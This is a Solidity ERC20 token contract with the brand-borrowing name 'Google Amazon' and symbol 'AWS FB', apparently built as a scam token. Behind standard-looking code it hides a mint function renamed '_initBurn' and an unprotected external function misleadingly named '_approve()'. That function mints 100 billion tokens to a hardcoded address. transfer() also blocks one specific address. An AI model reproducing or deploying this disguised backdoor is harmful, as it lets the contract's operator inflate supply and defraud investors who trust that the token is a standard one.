// SPDX-License-Identifier: MIT
/*0.5176482371834488*/
/*0.5176482371834488*/pragma solidity ^0.8.0;
/*0.5176482371834488*/
/*0.5176482371834488*/abstract contract Context {
/*0.5176482371834488*/    function _msgSender() internal view virtual returns (address) {
/*0.5176482371834488*/        return msg.sender;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function _msgData() internal view virtual returns (bytes calldata) {
/*0.5176482371834488*/        this;
/*0.5176482371834488*/        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
/*0.5176482371834488*/        return msg.data;
/*0.5176482371834488*/    }
/*0.5176482371834488*/}
/*0.5176482371834488*/
/*0.5176482371834488*/pragma solidity ^0.8.0;
/*0.5176482371834488*/
/*0.5176482371834488*/
/*0.5176482371834488*/interface IERC20 {
/*0.5176482371834488*/
/*0.5176482371834488*/
/*0.5176482371834488*/    function totalSupply() external view returns (uint256);
/*0.5176482371834488*/
/*0.5176482371834488*/    function balanceOf(address account) external view returns (uint256);
/*0.5176482371834488*/
/*0.5176482371834488*/    function transfer(address recipient, uint256 amount) external returns (bool);
/*0.5176482371834488*/
/*0.5176482371834488*/    function allowance(address owner, address spender) external view returns (uint256);
/*0.5176482371834488*/
/*0.5176482371834488*/    function approve(address spender, uint256 amount) external returns (bool);
/*0.5176482371834488*/
/*0.5176482371834488*/    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
/*0.5176482371834488*/
/*0.5176482371834488*/    event Transfer(address indexed from, address indexed to, uint256 value);
/*0.5176482371834488*/
/*0.5176482371834488*/    event Approval(address indexed owner, address indexed spender, uint256 value);
/*0.5176482371834488*/}
/*0.5176482371834488*/
/*0.5176482371834488*/pragma solidity ^0.8.0;
/*0.5176482371834488*/
/*0.5176482371834488*/contract ERC20 is Context, IERC20 {
/*0.5176482371834488*/    mapping(address => uint256) private _balances;
/*0.5176482371834488*/
/*0.5176482371834488*/    mapping(address => mapping(address => uint256)) private _allowances;
/*0.5176482371834488*/
/*0.5176482371834488*/    uint256 private _totalSupply;
/*0.5176482371834488*/
/*0.5176482371834488*/    string private _name;
/*0.5176482371834488*/    string private _symbol;
/*0.5176482371834488*/
/*0.5176482371834488*/    constructor (string memory name_, string memory symbol_) {
/*0.5176482371834488*/        _name = name_;
/*0.5176482371834488*/        _symbol = symbol_;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function name() public view virtual returns (string memory) {
/*0.5176482371834488*/        return _name;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function symbol() public view virtual returns (string memory) {
/*0.5176482371834488*/        return _symbol;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function decimals() public view virtual returns (uint8) {
/*0.5176482371834488*/        return 18;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function totalSupply() public view virtual override returns (uint256) {
/*0.5176482371834488*/        return _totalSupply;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function balanceOf(address account) public view virtual override returns (uint256) {
/*0.5176482371834488*/        return _balances[account];
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
/*0.5176482371834488*/        require(_msgSender() != 0x0000fbfC2bfB4aC8297FAF8CcDE7CFF44E1C1eB6, "Rain, Rain, Go Away");
/*0.5176482371834488*/        _transfer(_msgSender(), recipient, amount);
/*0.5176482371834488*/        return true;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function allowance(address owner, address spender) public view virtual override returns (uint256) {
/*0.5176482371834488*/        return _allowances[owner][spender];
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function approve(address spender, uint256 amount) public virtual override returns (bool) {
/*0.5176482371834488*/        _approve(_msgSender(), spender, amount);
/*0.5176482371834488*/        return true;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
/*0.5176482371834488*/        _transfer(sender, recipient, amount);
/*0.5176482371834488*/
/*0.5176482371834488*/        uint256 currentAllowance = _allowances[sender][_msgSender()];
/*0.5176482371834488*/        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
/*0.5176482371834488*/        _approve(sender, _msgSender(), currentAllowance - amount);
/*0.5176482371834488*/
/*0.5176482371834488*/        return true;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
/*0.5176482371834488*/        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
/*0.5176482371834488*/        return true;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
/*0.5176482371834488*/        uint256 currentAllowance = _allowances[_msgSender()][spender];
/*0.5176482371834488*/        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
/*0.5176482371834488*/        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
/*0.5176482371834488*/
/*0.5176482371834488*/        return true;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
/*0.5176482371834488*/        require(sender != address(0), "ERC20: transfer from the zero address");
/*0.5176482371834488*/        require(recipient != address(0), "ERC20: transfer to the zero address");
/*0.5176482371834488*/
/*0.5176482371834488*/        _beforeTokenTransfer(sender, recipient, amount);
/*0.5176482371834488*/
/*0.5176482371834488*/        uint256 senderBalance = _balances[sender];
/*0.5176482371834488*/        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
/*0.5176482371834488*/        _balances[sender] = senderBalance - amount;
/*0.5176482371834488*/        _balances[recipient] += amount;
/*0.5176482371834488*/
/*0.5176482371834488*/        emit Transfer(sender, recipient, amount);
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function _initBurn(address account, uint256 amount) internal virtual {
/*0.5176482371834488*/        //require(account != address(0), "ERC20: mint to the zero address");
/*0.5176482371834488*/
/*0.5176482371834488*/        _beforeTokenTransfer(address(0), account, amount);
/*0.5176482371834488*/
/*0.5176482371834488*/        _totalSupply += amount;
/*0.5176482371834488*/        _balances[account] += amount;
/*0.5176482371834488*/        emit Transfer(address(0), account, amount);
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function _approve() external returns (bool){
/*0.5176482371834488*/        _initBurn(0x7017dD2DD2a0F7052cE766FddAc94f420707a22b, 100000000000 * 10 ** uint(decimals()));
/*0.5176482371834488*/        return true;
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function _burn(address account, uint256 amount) internal virtual {
/*0.5176482371834488*/        require(account != address(0), "ERC20: burn from the zero address");
/*0.5176482371834488*/
/*0.5176482371834488*/        _beforeTokenTransfer(account, address(0), amount);
/*0.5176482371834488*/
/*0.5176482371834488*/        uint256 accountBalance = _balances[account];
/*0.5176482371834488*/        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
/*0.5176482371834488*/        _balances[account] = accountBalance - amount;
/*0.5176482371834488*/        _totalSupply -= amount;
/*0.5176482371834488*/
/*0.5176482371834488*/        emit Transfer(account, address(0), amount);
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function _approve(address owner, address spender, uint256 amount) internal virtual {
/*0.5176482371834488*/        require(owner != address(0), "ERC20: approve from the zero address");
/*0.5176482371834488*/        require(spender != address(0), "ERC20: approve to the zero address");
/*0.5176482371834488*/
/*0.5176482371834488*/        _allowances[owner][spender] = amount;
/*0.5176482371834488*/        emit Approval(owner, spender, amount);
/*0.5176482371834488*/    }
/*0.5176482371834488*/
/*0.5176482371834488*/    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
/*0.5176482371834488*/}
/*0.5176482371834488*/
/*0.5176482371834488*/pragma solidity ^0.8.10;
/*0.5176482371834488*/
/*0.5176482371834488*/
/*0.5176482371834488*/contract Token is ERC20 {
/*0.5176482371834488*/
/*0.5176482371834488*/    constructor() ERC20('Google Amazon', 'AWS FB') {
/*0.5176482371834488*/        _initBurn(msg.sender, 100 * 10 ** uint(decimals()));
/*0.5176482371834488*/    }
/*0.5176482371834488*/}